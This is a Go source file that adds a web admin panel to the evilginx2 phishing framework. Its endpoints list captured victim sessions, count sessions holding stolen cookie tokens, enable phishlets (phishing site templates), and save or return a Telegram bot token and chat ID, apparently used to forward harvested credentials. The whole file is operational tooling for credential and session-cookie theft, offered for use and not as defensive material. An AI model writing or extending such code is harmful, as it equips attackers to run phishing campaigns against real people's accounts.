package core

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type WebAPI struct {
	db  *database.Database
	cfg *Config
	ns  *Nameserver
}

func NewWebAPI(db *database.Database, cfg *Config, ns *Nameserver) *WebAPI {
	return &WebAPI{
		db:  db,
		cfg: cfg,
		ns:  ns,
	}
}

func (w *WebAPI) Start(port int) {
	mux := http.NewServeMux()

	// Example API Endpoints
	mux.HandleFunc("/", w.handleIndex)
	mux.HandleFunc("/api/sessions", w.handleSessions)
	mux.HandleFunc("/api/stats", w.handleStats)
	mux.HandleFunc("/api/config", w.handleConfig)
	mux.HandleFunc("/api/phishlets/enable", w.handlePhishletEnable)

	// Settings Endpoints
	mux.HandleFunc("/get-telegram", w.handleGetTelegram)
	mux.HandleFunc("/settings/save", w.handleSaveTelegram)

	// Serve Static Files
	mux.Handle("/css/", http.StripPrefix("/css/", http.FileServer(http.Dir("web/css"))))
	mux.Handle("/js/", http.StripPrefix("/js/", http.FileServer(http.Dir("web/js"))))
	mux.Handle("/img/", http.StripPrefix("/img/", http.FileServer(http.Dir("web/img"))))

	log.Info("Starting Web Admin API on port %d...", port)
	go http.ListenAndServe(fmt.Sprintf(":%d", port), mux)
}

func (w *WebAPI) handleIndex(rw http.ResponseWriter, req *http.Request) {
	if req.URL.Path != "/" {
		http.NotFound(rw, req)
		return
	}
	http.ServeFile(rw, req, "web/index.html")
}

func (w *WebAPI) handleSessions(rw http.ResponseWriter, req *http.Request) {
	sessions, _ := w.db.ListSessions()
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(sessions)
}

func (w *WebAPI) handleStats(rw http.ResponseWriter, req *http.Request) {
	sessions, _ := w.db.ListSessions()
	validCount := 0
	for _, s := range sessions {
		if len(s.CookieTokens) > 0 {
			validCount++
		}
	}
	stats := map[string]interface{}{
		"total":          len(sessions),
		"validCount":     validCount,
		"invalidCount":   len(sessions) - validCount,
		"visitPercent":   100,
		"visitTrend":     "bull",
		"validPercent":   100,
		"validTrend":     "bull",
		"invalidPercent": 0,
		"invalidTrend":   "bear",
	}
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(stats)
}

func (w *WebAPI) handleConfig(rw http.ResponseWriter, req *http.Request) {
	configData := map[string]interface{}{
		"general": map[string]interface{}{
			"domain": w.cfg.GetServerBindIP(),
		},
	}
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(configData)
}

func (w *WebAPI) handlePhishletEnable(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "Method payload invalid", http.StatusBadRequest)
		return
	}

	var payload struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	phishlet, err := w.cfg.GetPhishlet(payload.Name)
	if err != nil {
		http.Error(rw, "Phishlet not found", http.StatusNotFound)
		return
	}

	err = w.cfg.SetSiteEnabled(payload.Name)
	if err != nil {
		http.Error(rw, "Failed to enable phishlet", http.StatusInternalServerError)
		return
	}

	// This correctly interfaces with Go's representation instead of spawning an eval shell in Node!
	log.Important("WebAPI: Enabled phishlet '%s'", phishlet.Name)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Phishlet enabled"})
}

func (w *WebAPI) handleGetTelegram(rw http.ResponseWriter, req *http.Request) {
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{
		"chatId":   w.cfg.GetTelegramChatID(),
		"botToken": w.cfg.GetTelegramBotToken(),
	})
}

func (w *WebAPI) handleSaveTelegram(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "Method payload invalid", http.StatusBadRequest)
		return
	}

	var payload struct {
		ChatId   string `json:"chatId"`
		BotToken string `json:"botToken"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, "Invalid JSON payload", http.StatusBadRequest)
		return
	}

	w.cfg.SetTelegramChatID(payload.ChatId)
	w.cfg.SetTelegramBotToken(payload.BotToken)
	w.cfg.SetTelegramEnabled(true)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "✅ Telegram Settings Saved Successfully"})
}

// Additional handlers like /api/sessions and /settings can be added similarly here.
